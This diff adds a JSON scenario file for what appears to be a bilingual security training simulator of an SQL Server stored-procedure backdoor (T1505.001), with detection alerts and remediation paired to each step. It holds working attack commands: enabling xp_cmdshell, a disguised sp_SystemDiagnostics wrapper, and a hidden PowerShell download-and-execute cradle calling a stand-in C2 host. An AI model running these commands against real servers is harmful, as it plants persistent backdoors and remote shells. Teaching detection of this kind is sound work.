@@ -1,0 +1,189 @@
+{
+  "id": "T1505.001",
+  "title": "SQL 저장 프로시저 백도어 시뮬레이션",
+  "titleEn": "SQL Stored Procedure Backdoor Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 정찰", "labelEn": "🔍 Recon", "steps": [0] },
+    { "label": "⚡ xp_cmdshell 활성화", "labelEn": "⚡ xp_cmdshell Enable", "steps": [1] },
+    { "label": "🔓 백도어 프로시저", "labelEn": "🔓 Backdoor Procedure", "steps": [2, 3] },
+    { "label": "🛡️ 검증", "labelEn": "🛡️ Verification", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 50, "y": 80 },
+    { "id": "sqlserver", "label": "SQL Server\nSQL-DB01", "x": 250, "y": 80 },
+    { "id": "master", "label": "master DB\nStored Procs", "x": 450, "y": 30 },
+    { "id": "os", "label": "OS Layer\ncmd.exe", "x": 450, "y": 130 },
+    { "id": "c2", "label": "C2 Server\n203.0.113.99", "x": 50, "y": 160 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "sqlserver", "minStep": 0 },
+    { "from": "sqlserver", "to": "master", "minStep": 2 },
+    { "from": "master", "to": "os", "minStep": 3 },
+    { "from": "os", "to": "c2", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "SSMS", "icon": "🗄️" },
+    { "name": "PowerShell", "icon": "💻" },
+    { "name": "Event Viewer", "icon": "📋" },
+    { "name": "SQL Config", "icon": "⚙️" }
+  ],
+  "steps": [
+    {
+      "cmd": "SELECT @@VERSION; SELECT name, value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell', 'clr enabled', 'show advanced options');",
+      "out": "Microsoft SQL Server 2019 (RTM-CU18) - 15.0.4261.1\nDeveloper Edition (64-bit) on Windows Server 2019\n\nname                    value_in_use\n----------------------  ------------\nshow advanced options   0\nxp_cmdshell             0\nclr enabled             0\n\n[*] SQL Server 2019 Developer Edition\n[*] xp_cmdshell: Disabled\n[*] CLR Integration: Disabled\n[*] Service Account: NT SERVICE\\MSSQLSERVER\n[*] Current user: sa (sysadmin)",
+      "def": "[EDR] SQL Server configuration enumeration - potential xp_cmdshell enablement",
+      "defAction": "Source: SQL Server Audit log\nTarget: sys.configurations query\nAction: Configuration query logged, baseline comparison",
+      "desc": "SQL Server 버전과 보안 관련 구성 설정을 확인합니다.",
+      "descEn": "The attacker checks SQL Server version and security-related configuration settings.",
+      "stepTitle": "SQL Server 구성 정찰",
+      "stepTitleEn": "SQL Server Configuration Reconnaissance",
+      "feynman": "금고의 보안 설정을 확인하는 것과 같습니다. xp_cmdshell이 비활성화되어 있으면 활성화해야 하고, sa 계정으로 접근했으므로 모든 설정을 변경할 수 있습니다.",
+      "feynmanEn": "It's like checking the safe's security settings. If xp_cmdshell is disabled, it needs to be enabled. Having sa access means all settings can be changed.",
+      "expert": "sa 계정은 SQL Server의 최고 관리자 계정(sysadmin 역할)입니다. sys.configurations에서 xp_cmdshell, CLR enabled 등의 설정을 확인하여 공격에 활용할 기능의 활성화 여부를 판단합니다. NT SERVICE\\MSSQLSERVER는 SQL Server의 기본 서비스 계정으로 상당한 시스템 권한을 가집니다.",
+      "expertEn": "sa is SQL Server's highest admin account (sysadmin role). Checking sys.configurations for xp_cmdshell, CLR enabled helps determine which attack features need activation. NT SERVICE\\MSSQLSERVER is the default service account with significant system privileges.",
+      "defTooltip": "🔐 SQL Server 구성 열거! xp_cmdshell 활성화 시도 가능성.",
+      "defTooltipEn": "🔐 SQL Server configuration enumeration! Potential xp_cmdshell enablement attempt.",
+      "hackerLog": {
+        "title": "sql_recon.txt",
+        "lines": [
+          { "log": "xp_cmdshell: Disabled", "desc": "💡 현재 비활성화 - 활성화 필요" },
+          { "log": "Current user: sa (sysadmin)", "desc": "💡 최고 관리자 - 모든 설정 변경 가능" },
+          { "log": "Service Account: NT SERVICE\\MSSQLSERVER", "desc": "💡 서비스 계정 - OS 명령 실행 시 이 권한으로 실행" }
+        ]
+      },
+      "terms": [
+        { "name": "xp_cmdshell", "desc": "SQL Server 확장 저장 프로시저. OS 명령을 SQL 쿼리에서 직접 실행합니다." },
+        { "name": "sa 계정", "desc": "SQL Server의 시스템 관리자(sysadmin) 계정. 모든 데이터베이스와 서버 설정에 대한 완전한 접근 권한을 가집니다." },
+        { "name": "CLR Integration", "desc": "SQL Server에서 .NET 어셈블리를 로드하고 실행할 수 있는 기능입니다." }
+      ]
+    },
+    {
+      "cmd": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+      "out": "Configuration option 'show advanced options' changed from 0 to 1.\nConfiguration option 'xp_cmdshell' changed from 0 to 1.\n\n[*] xp_cmdshell enabled successfully\n[*] Testing: EXEC xp_cmdshell 'whoami'\n\noutput\n-------------------------------\nnt service\\mssqlserver\nNULL\n\n[*] OS command execution: CONFIRMED\n[*] Running as: NT SERVICE\\MSSQLSERVER\n[*] xp_cmdshell is now available for command execution",
+      "def": "[EDR] CRITICAL - xp_cmdshell enabled on SQL Server",
+      "defAction": "Source: SQL Server Audit + Sysmon Event ID 1\nTarget: sp_configure xp_cmdshell change\nAction: xp_cmdshell disabled, sa password reset, SQL audit reviewed",
+      "desc": "xp_cmdshell을 활성화하여 SQL Server에서 OS 명령 실행을 가능하게 합니다.",
+      "descEn": "The attacker enables xp_cmdshell for OS command execution from SQL Server.",
+      "stepTitle": "xp_cmdshell 활성화",
+      "stepTitleEn": "xp_cmdshell Enablement",
+      "feynman": "금고의 비밀 통로를 여는 것과 같습니다. 원래 잠겨 있던 통로(xp_cmdshell)를 열면 금고(SQL Server) 안에서 건물 전체(운영 체제)에 접근할 수 있습니다.",
+      "feynmanEn": "It's like opening a secret passage in the safe. Unlocking the passage (xp_cmdshell) lets you access the entire building (operating system) from inside the safe (SQL Server).",
+      "expert": "sp_configure로 xp_cmdshell을 활성화하면 SQL Server의 보안 경계를 넘어 OS 수준의 명령을 실행할 수 있습니다. RECONFIGURE로 즉시 적용됩니다. SQL Server 감사 로그(C2 Audit Mode)를 사용하면 이 변경을 기록할 수 있습니다.",
+      "expertEn": "Enabling xp_cmdshell via sp_configure breaks SQL Server's security boundary for OS-level command execution. RECONFIGURE applies changes immediately. SQL Server Audit Logging (C2 Audit Mode) can record this change.",
+      "defTooltip": "🔐 xp_cmdshell 활성화! SQL Server에서 OS 명령 실행이 가능합니다.",
+      "defTooltipEn": "🔐 xp_cmdshell enabled! OS command execution possible from SQL Server.",
+      "hackerLog": {
+        "title": "cmdshell_enable.txt",
+        "lines": [
+          { "log": "xp_cmdshell changed from 0 to 1", "desc": "💡 xp_cmdshell 활성화 완료" },
+          { "log": "Running as: NT SERVICE\\MSSQLSERVER", "desc": "💡 SQL Server 서비스 계정으로 명령 실행" },
+          { "log": "OS command execution: CONFIRMED", "desc": "💡 OS 명령 실행 확인 - 시스템 접근 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "sp_configure", "desc": "SQL Server 시스템 구성을 변경하는 저장 프로시저. 서버 수준 설정을 관리합니다." },
+        { "name": "RECONFIGURE", "desc": "sp_configure로 변경한 설정을 즉시 적용하는 SQL 명령입니다." },
+        { "name": "show advanced options", "desc": "sp_configure에서 xp_cmdshell 등 고급 옵션을 표시하기 위해 필요한 사전 설정입니다." }
+      ]
+    },
+    {
+      "cmd": "CREATE PROCEDURE [dbo].[sp_SystemDiagnostics] @cmd NVARCHAR(4000) AS BEGIN EXEC xp_cmdshell @cmd; END;",
+      "out": "Command(s) completed successfully.\n\n[*] Backdoor stored procedure created:\n    Name: sp_SystemDiagnostics\n    Database: master\n    Parameter: @cmd (NVARCHAR)\n    Mechanism: Wraps xp_cmdshell\n    Access: Any sysadmin or user with EXECUTE permission\n\n[*] Usage:\n    EXEC sp_SystemDiagnostics 'whoami'\n    EXEC sp_SystemDiagnostics 'net user'\n    EXEC sp_SystemDiagnostics 'powershell -e <base64>'",
+      "def": "[EDR] New stored procedure wrapping xp_cmdshell created in master database",
+      "defAction": "Source: SQL Server Audit (DDL events)\nTarget: sp_SystemDiagnostics procedure creation\nAction: Procedure dropped, xp_cmdshell disabled, database access audit",
+      "desc": "xp_cmdshell을 감싸는 합법적 이름의 저장 프로시저를 생성합니다.",
+      "descEn": "The attacker creates a stored procedure wrapping xp_cmdshell with a legitimate-sounding name.",
+      "stepTitle": "백도어 저장 프로시저 생성",
+      "stepTitleEn": "Backdoor Stored Procedure Creation",
+      "feynman": "비밀 통로에 '시스템 진단 도구'라는 안내판을 달아놓는 것과 같습니다. 다른 관리자가 이 프로시저를 보면 정상적인 진단 도구로 생각할 수 있습니다.",
+      "feynmanEn": "It's like putting a 'System Diagnostics Tool' sign on the secret passage. Other admins seeing this procedure might think it's a legitimate diagnostic tool.",
+      "expert": "master 데이터베이스에 저장 프로시저를 생성하면 서버의 모든 데이터베이스에서 접근 가능합니다. sp_ 접두사는 시스템 저장 프로시저를 연상시켜 위장에 유용합니다. DDL 트리거나 SQL Server Audit로 CREATE PROCEDURE 이벤트를 모니터링해야 합니다.",
+      "expertEn": "Creating a stored procedure in master database makes it accessible from all databases. The sp_ prefix mimics system stored procedures for disguise. DDL triggers or SQL Server Audit should monitor CREATE PROCEDURE events.",
+      "defTooltip": "🔐 master DB에 xp_cmdshell 래핑 프로시저 생성! 백도어가 설치되었습니다.",
+      "defTooltipEn": "🔐 xp_cmdshell wrapping procedure created in master DB! Backdoor installed.",
+      "hackerLog": {
+        "title": "backdoor_proc.txt",
+        "lines": [
+          { "log": "Name: sp_SystemDiagnostics", "desc": "💡 정상 시스템 도구로 위장된 이름" },
+          { "log": "Database: master", "desc": "💡 master DB - 모든 데이터베이스에서 접근 가능" },
+          { "log": "Wraps xp_cmdshell", "desc": "💡 xp_cmdshell을 감싸서 간접 호출" }
+        ]
+      },
+      "terms": [
+        { "name": "CREATE PROCEDURE", "desc": "SQL Server에서 저장 프로시저를 생성하는 DDL(Data Definition Language) 명령입니다." },
+        { "name": "master 데이터베이스", "desc": "SQL Server의 시스템 데이터베이스. 서버 수준의 메타데이터와 시스템 프로시저가 저장됩니다." },
+        { "name": "DDL 트리거", "desc": "CREATE, ALTER, DROP 등 구조 변경 이벤트에 반응하는 트리거입니다." }
+      ]
+    },
+    {
+      "cmd": "EXEC sp_SystemDiagnostics 'powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(''https://203.0.113.99/payload'')\"'",
+      "out": "output\n-------------------------------\n[*] PowerShell executed successfully\n[*] Reverse shell established\nNULL\n\n[*] Attack chain:\n    1. SQL query → sp_SystemDiagnostics\n    2. sp_SystemDiagnostics → xp_cmdshell\n    3. xp_cmdshell → powershell.exe\n    4. PowerShell → C2 reverse shell\n\n[*] Execution context:\n    SQL: sa (sysadmin)\n    OS: NT SERVICE\\MSSQLSERVER\n    PowerShell: Hidden window, no profile\n    C2: 203.0.113.99:443 ESTABLISHED",
+      "def": "[SIEM] CRITICAL - SQL Server spawned PowerShell with C2 connection via xp_cmdshell",
+      "defAction": "Source: Sysmon Event ID 1 + Network Detection\nTarget: sqlservr.exe → cmd.exe → powershell.exe chain\nAction: All processes terminated, C2 blocked, xp_cmdshell disabled, sa credentials changed",
+      "desc": "백도어 프로시저를 통해 PowerShell 리버스 셸을 실행합니다.",
+      "descEn": "The attacker executes a PowerShell reverse shell through the backdoor procedure.",
+      "stepTitle": "백도어 프로시저 통한 리버스 셸",
+      "stepTitleEn": "Reverse Shell via Backdoor Procedure",
+      "feynman": "비밀 통로를 통해 건물 밖의 공격자에게 전화선을 연결하는 것과 같습니다. SQL 쿼리 하나로 서버에 원격 접근 채널이 열립니다.",
+      "feynmanEn": "It's like running a phone line through the secret passage to the attacker outside. A single SQL query opens a remote access channel to the server.",
+      "expert": "sqlservr.exe → cmd.exe → powershell.exe 프로세스 체인은 SQL Server 기반 명령 실행의 핵심 탐지 지표입니다. -nop(NoProfile), -w hidden(숨김 윈도우)은 PowerShell 공격의 일반적인 플래그입니다. SQL Server 서비스 계정의 네트워크 연결은 정상적이지 않으며 즉각적인 조사가 필요합니다.",
+      "expertEn": "The sqlservr.exe → cmd.exe → powershell.exe process chain is a key detection indicator for SQL Server-based command execution. -nop (NoProfile), -w hidden are common PowerShell attack flags. Network connections from SQL Server service account are abnormal and require immediate investigation.",
+      "defTooltip": "🔐 SQL Server에서 PowerShell + C2 연결! xp_cmdshell 기반 리버스 셸입니다.",
+      "defTooltipEn": "🔐 PowerShell + C2 from SQL Server! xp_cmdshell-based reverse shell.",
+      "hackerLog": {
+        "title": "reverse_shell.txt",
+        "lines": [
+          { "log": "sqlservr.exe → cmd.exe → powershell.exe", "desc": "💡 프로세스 체인 - SQL Server 기반 명령 실행 패턴" },
+          { "log": "C2: 203.0.113.99:443 ESTABLISHED", "desc": "💡 HTTPS C2 연결 성공" },
+          { "log": "Hidden window, no profile", "desc": "💡 숨김 창 + NoProfile - 탐지 우회" }
+        ]
+      },
+      "terms": [
+        { "name": "리버스 셸", "desc": "피해 서버에서 공격자에게 역방향으로 연결하는 셸. 방화벽의 인바운드 차단을 우회합니다." },
+        { "name": "-nop", "desc": "PowerShell의 -NoProfile 약어. Profile 스크립트를 로드하지 않아 실행 속도를 높입니다." },
+        { "name": "프로세스 체인", "desc": "부모-자식 프로세스의 연쇄 관계. 비정상적인 체인은 공격 탐지의 핵심 지표입니다." }
+      ]
+    },
+    {
+      "cmd": "SELECT name, type_desc, create_date FROM sys.procedures WHERE name LIKE 'sp_System%'; EXEC xp_cmdshell 'netstat -an | findstr ESTABLISHED';",
+      "out": "name                    type_desc           create_date\n---------------------  ------------------  -----------------------\nsp_SystemDiagnostics   SQL_STORED_PROCEDURE 2026-03-01 15:45:00.000\n\noutput\n-------------------------------\n  TCP    10.0.2.30:49612     203.0.113.99:443    ESTABLISHED\n  TCP    10.0.2.30:1433      10.0.1.100:52841    ESTABLISHED\nNULL\n\n[+] Backdoor procedure persistence: ACTIVE\n[+] C2 connection: ESTABLISHED (203.0.113.99:443)\n[+] SQL client connection: ACTIVE (10.0.1.100)\n[+] xp_cmdshell: ENABLED\n[+] Procedure survives server restart: YES (stored in master DB)",
+      "def": "[SIEM] SQL backdoor persistence confirmed - C2 channel active via xp_cmdshell",
+      "defAction": "Source: SQL Server Audit + Network monitoring\nTarget: sp_SystemDiagnostics + C2 connection\nAction: Procedure dropped, xp_cmdshell disabled, network connection blocked, incident response",
+      "desc": "백도어 프로시저의 존재와 C2 연결을 확인하여 지속성을 검증합니다.",
+      "descEn": "The attacker verifies persistence by confirming the backdoor procedure's existence and C2 connection.",
+      "stepTitle": "백도어 프로시저 지속성 검증",
+      "stepTitleEn": "Backdoor Procedure Persistence Verification",
+      "feynman": "비밀 통로가 잘 작동하고, 전화선(C2)이 연결되어 있는지 점검하는 것과 같습니다. 저장 프로시저는 데이터베이스에 영구 저장되므로 서버 재시작 후에도 유지됩니다.",
+      "feynmanEn": "It's like checking the secret passage works and the phone line (C2) is connected. Stored procedures are permanently saved in the database, persisting through server restarts.",
+      "expert": "master 데이터베이스의 저장 프로시저는 SQL Server 재시작 후에도 유지됩니다. sys.procedures에서 프로시저 목록을 확인하고, netstat으로 C2 연결 상태를 검증합니다. 완전한 복구를 위해 프로시저 삭제, xp_cmdshell 비활성화, sa 비밀번호 변경, SQL Server 감사 로그 검토가 필요합니다.",
+      "expertEn": "Stored procedures in master database persist through SQL Server restarts. sys.procedures lists procedures, and netstat verifies C2 connection status. Complete recovery requires procedure deletion, xp_cmdshell disablement, sa password change, and SQL Server audit log review.",
+      "defTooltip": "🔐 SQL 백도어 지속성 확인! C2 채널이 xp_cmdshell을 통해 활성 상태입니다.",
+      "defTooltipEn": "🔐 SQL backdoor persistence confirmed! C2 channel active via xp_cmdshell.",
+      "hackerLog": {
+        "title": "persistence_verify.txt",
+        "lines": [
+          { "log": "sp_SystemDiagnostics: exists in master DB", "desc": "💡 백도어 프로시저 존재 확인" },
+          { "log": "C2: 203.0.113.99:443 ESTABLISHED", "desc": "💡 C2 연결 유지 중" },
+          { "log": "Survives server restart: YES", "desc": "💡 서버 재시작 후에도 프로시저 유지" }
+        ]
+      },
+      "terms": [
+        { "name": "sys.procedures", "desc": "SQL Server의 시스템 카탈로그 뷰. 현재 데이터베이스의 모든 저장 프로시저 메타데이터를 조회합니다." },
+        { "name": "netstat", "desc": "네트워크 연결 상태를 표시하는 명령. ESTABLISHED 상태는 활성 연결을 나타냅니다." },
+        { "name": "SQL Server 감사", "desc": "SQL Server의 기본 감사 기능. 로그인, 쿼리, 구성 변경 등을 기록합니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "sqlservr.exe (SQL Server)", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "SELECT sys.configurations", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "sp_configure xp_cmdshell", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "CREATE PROCEDURE sp_SystemDiag", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "xp_cmdshell → cmd.exe", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "powershell.exe (-hidden)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "C2 → 203.0.113.99:443", "depth": 3, "alert": true, "minStep": 3 },
+    { "name": "netstat -an (verify)", "depth": 1, "alert": false, "minStep": 4 }
+  ]
+}
